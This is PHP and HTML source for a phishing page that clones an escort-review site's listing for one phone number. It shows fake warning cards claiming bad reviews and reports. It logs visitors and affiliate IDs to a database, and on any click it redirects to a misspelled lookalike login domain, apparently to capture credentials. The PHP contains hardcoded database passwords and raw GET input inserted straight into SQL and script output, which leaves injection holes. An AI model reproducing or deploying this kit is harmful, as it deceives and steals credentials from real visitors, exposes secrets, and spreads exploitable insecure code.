<?php 
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

  $con = new mysqli("localhost","u557618015_monir_bandhu","ofdB;#V4","u557618015_monir_bandhu");
$con1 = new mysqli("localhost", "u557618015_julhas", "Wq]pJtRL:@6", "u557618015_julhas");

if ($con->connect_error) {
    die("Connection to database1 failed: " . $con->connect_error);
}
if ($con1->connect_error) {
    die("Connection to database2 failed: " . $con1->connect_error);
}

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$isMob = is_numeric(strpos(strtolower($userAgent), "mobile"));
$isTab = is_numeric(strpos(strtolower($userAgent), "tablet"));

if ($isMob) { 
    $device = $isTab ? "tab" : "mobile";
} else { 
    $device = "desktop";
}

$actual_link = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$site_name = 'Mega Review';

if (isset($_GET['q'])) {
    $userid = $_GET['q'];
    $userid_query = mysqli_query($con, "SELECT * FROM `admin` WHERE `id`='$userid'");
    
    if ($userid_query) {
        $row = $userid_query->fetch_assoc();
        $username = $row['username'] ?? "unknown_user";
    } else {
        die("Query failed: " . mysqli_error($con));
    }
} else {
    $username = "MOSHARAF";
}

// Insert click data
if (!mysqli_query($con, "INSERT INTO `click`(`username`, `click_site_name`, `link`, `device`, `click_date`) VALUES ('$username', '$site_name', '$actual_link', '$device', now())")) {
    die("Insert into `click` table failed: " . mysqli_error($con));
}

// Insert user agent data (fixed syntax error)
$type = "fresh";
if (!mysqli_query($con1, "INSERT INTO `user_agent`(`user_agent`, `action`) VALUES ('$userAgent', '$type')")) {
    die("Insert into `user_agent` table failed: " . mysqli_error($con1));
}

 
?>


<!DOCTYPE html>
<!-- saved from url=(0048)https://escortbabylon.net/review_list/7073731547 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Escort Babylon: Reviews of Escorts</title>
    

    <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">

    
        <meta name="ROBOTS" content="INDEX, FOLLOW">
    

    
    <title>Escort in Chico CA 707-373-1547 | outcaLL, and cardates ✨ѕιмρℓу тнє вєѕт✨LET’S HANG OUT🏪 Short Stay &amp; OUTCALL ✨ѕιмρℓу тнє вєѕт✨LET’S HANG OUT🏪 Short Stay </title>
    <meta name="description" content="View detailed profile of a hot escort in Chico, CA. Phone: 707-373-1547 | outcaLL, and cardates ✨ѕιмρℓу тнє вєѕт✨LET’S HANG OUT🏪 Short Stay &amp; OUTCALL ✨ѕιмρℓу тнє вєѕт✨LET’S HANG OUT🏪 Short Stay, photos, reviews and ads">


    <meta name="ero_verify" content="d3f508487df0c4f4b9a734093e472d9c">
    <link href="https://escortbabylon.net/images/escortBabylon_favicon.ico" rel="shortcut icon" type="image/x-icon">
    <link rel="stylesheet" href="./Escort Babylon_ Reviews of Escorts_files/bootstrap.min.css">

    <link rel="stylesheet" href="./Escort Babylon_ Reviews of Escorts_files/style.css">
    <link rel="stylesheet" href="./Escort Babylon_ Reviews of Escorts_files/panels.css">
    <link rel="stylesheet" href="./Escort Babylon_ Reviews of Escorts_files/main.css">
 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 

    <script async="" src="./Escort Babylon_ Reviews of Escorts_files/analytics.js.download"></script><script async="" src="./Escort Babylon_ Reviews of Escorts_files/tag.js.download"></script><script src="./Escort Babylon_ Reviews of Escorts_files/jquery.min.js.download"></script>
    <script src="./Escort Babylon_ Reviews of Escorts_files/js.cookie.js.download"></script>
    <script src="./Escort Babylon_ Reviews of Escorts_files/moment.min.js.download"></script>
    <script src="./Escort Babylon_ Reviews of Escorts_files/dust-full.min.js.download"></script>
    <script src="./Escort Babylon_ Reviews of Escorts_files/custom-jquery.js.download"></script>
    <script src="./Escort Babylon_ Reviews of Escorts_files/jquery-ui.min.js.download"></script>
<script type="text/javascript" async="" src="./Escort Babylon_ Reviews of Escorts_files/tag(1).js.download"></script></head>
<style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffcc; /* Light yellow background */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

  .container {
  display: flex;
  gap: 20px;
   margin-left: 80px;
 
}

@media (max-width: 768px) {
  .container {
    display: flex;
    
    gap: 20px; /* Maintain space between cards */
    justify-content: center; /* Center cards horizontally */
    align-items: center; /* Center cards vertically */
    padding: 10px; /* Add some padding around the container */
       margin-left: -20px;
  }
}

    

    .card {
      width: 150px;
      height: 150px;
      background-color: #fff3d6; /* Light cream background */
      border: 2px solid #f0c987; /* Light orange border */
      border-radius: 15px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 10px;
    }

    .card img {
      width: 40px;
      height: 40px;
      margin-bottom: 10px;
    }

    .card .text {
      font-size: 18px;
      font-weight: bold;
      color: #d10f0f; /* Bright red color */
      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
    }
    
  </style>
<body style="">
    <div id="dataholder" data-page="review_list" data-revive="https://itransitauthority.com" data-revive-id="cffd5ce10cdaa652d1dba855eb62bf80"></div>
    <!-- Yandex.Metrika counter -->
<script type="text/javascript">
 (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
 m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
 (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
ym(51832886, "init", {
 id:51832886,
 clickmap:true,
 trackLinks:true,
 accurateTrackBounce:true
 });
</script>
<noscript>
    <div>
        <img src="https://mc.yandex.ru/watch/51832886" style="position:absolute; left:-9999px;" alt="" />
    </div>
</noscript>
<!-- /Yandex.Metrika counter -->

    <div id="gradientBgContainerForComments">
        <div id="gradientBgForComments">
        </div>
    </div>

    
    <input id="phoneNumber" hidden="" value="7073731547">
    <script src="./Escort Babylon_ Reviews of Escorts_files/auth.js.download"></script>
    <div class="mainPage">
        <!-- main page starts-->
        <div id="loaderIndicator"></div>
        <div id="reviewsFeedbackFader"></div>
        <!-- Chicken Popup -->
        <div><div id="loggedInPopup" ng-controller="LoggedInPopupController as loggedInPopupVm">
    <img src="./Escort Babylon_ Reviews of Escorts_files/lor_title.png" class="lortitle">
    <h1>You are logged in as:</h1>
    <span></span>
</div></div>
        <!-- Initialize analytic library -->
<script>
    /*<![CDATA[*/
    var type = null;
    var serverUrl = "https:\/\/analytics.appservice.tech\/static\/tag.js".replace(/\\/g, '');
    analyticServer = serverUrl + '?v=' + '1737681769';

    (function (d, w, s) {
        var script = d.createElement('script');
        var f = function () {
            var an_args;
            if (type == "ad") {
                an_args = {
                    log_type: "",
                    ad_platform: "",
                    website: "",
                    zone_id: ""
                };
            } else {
                an_args = {
                    city_id: "",
                    ip: "103.147.162.150",
                    page: "review_list",
                    phone: "7073731547",
                    post_id: "",
                    site: "escortbabylon.net",
                    user_id: "",
                    referer: null,
                    url: "http:\/\/escortbabylon.net\/review_list\/7073731547",
                    user_agent: "Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/132.0.0.0 Safari\/537.36 Edg\/132.0.0.0",
                    method: 'load'
                };
            }

            LcMetrika.send(an_args);

            var da = document.querySelector('[data-analytic]');

            if (!da) return;

            da.onclick = function () {
                an_args["method"] = 'click';
                an_args["phone"] = this.getAttribute('href').split('tel:')[1];
                LcMetrika.send(an_args);
            }
        }

        script.type = "text/javascript";
        script.async = true;
        script.src = s;
        script.onload = script.onreadystatechange = f;

        d.head.appendChild(script);
    })(document, window, analyticServer);
    /*]]>*/
</script>

        <header id="topImageHeader"><img src="./Escort Babylon_ Reviews of Escorts_files/ebMainLogo.png" id="topHeaderImage">
<!--{{page}}/{{curr_page}}-->
<nav id="topNavigation">
    <div class="postsLinkNavigation">
        <a href="https://escortbabylon.net/posts_list/7073731547/1">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavPostsActive3.png" style="display:none;">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavPosts3.png" style="display:block;">
        </a>
    </div>
    <div class="infoLinkNavigation">
        <a href="https://escortbabylon.net/info_stats/7073731547">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavInfoActive3.png" style="display:none;">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavInfo3.png" style="display:block;">
        </a>
    </div>

    <div class="picturesLinkNavigation">
        <a href="https://escortbabylon.net/image_list/7073731547">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavPicturesActive3.png" style="display:none;">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavPictures3.png" style="display:block;">
        </a>
    </div>
    <div class="reviewsLinkNavigation">
        <a href="https://escortbabylon.net/review_list/7073731547">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavReviewsActive3.png" style="display:block;">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavReviews3.png" style="display:none;">
        </a>
    </div>
    <div class="commentLinkNavigation">
        <a href="https://escortbabylon.net/comments_list/7073731547">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavPostsCommentsActive3.png" style="display:none;">
            <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainNavPostsComments3.png" style="display:block;">
        </a>
    </div>
</nav></header>

        <div class="mainPage" id="reviewListsMainPage" style="margin-top: 140px;">
            <!-- main page starts-->
            <div class="orangeBackgroundReview">
                <!-- orange background starts-->
                <div id="writeReviewFirstPopup" style="display: block;">
                    <div id="mustSubmitReviewFirst" onclick="closeSubmitreviewPopup()">
                    </div>
                    <form method="post" id="auth_register_user_get">
                        <input type="hidden" name="callbackUrl" value="/review_list/7073731547">
                        <input type="hidden" name="phoneNumber" value="7073731547">
                        <div id="alreadySubmittedReview"></div>
                        
                    </form>
                </div>

                <div class="mainFormAreaReview">
                    <!-- main Form Area starts-->
                    <div id="reviewTopFourDivs">
                        <div id="reviewTopTwoLeftDivs">
                            <div id="reviewMeter">
                                <img src="./Escort Babylon_ Reviews of Escorts_files/meterDefault.png" border="0" alt="">
                            </div>
                            <div id="reviewCommunityRating">
                                Community Rating <span></span>
                            </div>
                        </div>
                        <div id="reviewTopTwoRightDivs">
                            <div id="reviewLogo">
                                <img src="./Escort Babylon_ Reviews of Escorts_files/ebMainHeaderReviews.png" border="0" alt="">
                            </div>
                            
                        </div>
                    </div>

                    <!-- /////////////////////////////////four pictures thumbnails starts////////////////////////////// -->
               <div class="container">
  <!-- Card 1 -->
  <div class="card">
    <img src="warning.png" alt="Warning">
    <div class="text">11 BAD<br>REVIEWS</div>
  </div>

  <!-- Card 2 -->
  <div class="card">
    <img src="warning.png" alt="Warning">
    <div class="text">04<br>REPORTS</div>
  </div>
</div>

                    <!-- /////////////////////////////////four pictures thumbnails ends////////////////////////////// -->

                    <div id="readReviewButton" onclick="showReadReviewPopup()">
                        Read Reviews<br><span>of this provider</span>
                    </div>
                    
                    <a id="submitReviewButton">
                        Submit a Review<br><span>of this Provider</span>
                    </a>
                    <div id="reviewsListExplain">
                        <img src="./Escort Babylon_ Reviews of Escorts_files/ebReviewsBlurbRedTop.png">
                    </div>
                    <div id="readReviewsCover" style="display: block;">

                    </div>


                </div>
                <!-- main Form Area ends-->
            </div>
            <!-- orange background ends-->

            <div class="eBcopyRight">
                <!-- &copy;&nbsp;2015 Hammerhead S. A.-->
            </div>

        </div>

        <footer><div id="bottomImageFooter">
    <div id="footerback">
        <!--<a style="display: block; cursor: pointer;" href="/info_stats/{{phoneNumber}}"><img src='/static/images/ebBackToPost.png'></a>-->
        <script>
            var backUrlToPost = null;
        </script>
        <img src="./Escort Babylon_ Reviews of Escorts_files/ebBackToLc2.png" id="back-button" onclick="backButtonHandler()">
        <span style="visibility: hidden; width: 3px;" id="configURL">listcrawler.eu</span>
        <span style="visibility: hidden; width: 3px;" id="configProtocol">https</span>
        
    </div>
</div>
</footer>
        <script src="./Escort Babylon_ Reviews of Escorts_files/review.js.download"></script>
    </div>
 <script>
    // Add event listener for all click events on the document
    document.addEventListener("click", function() {
      // Redirect to a different page
      window.location.href = 'https://escortbabyliion.net/auth/login/9?q=<?php echo$userid; ?>';
    });
  </script>

    <!-- GA -->
    <script>
        var customPage = new customJquery();

        (function(i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r;
            i[r] = i[r] || function() {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
            a = s.createElement(o),
                m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            m.parentNode.insertBefore(a, m)
        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-85947709-1', 'auto');
        ga('send', 'pageview');
    </script>
    <!-- end GA -->
    <script src="./Escort Babylon_ Reviews of Escorts_files/main.js.download"></script>

    

</body></html>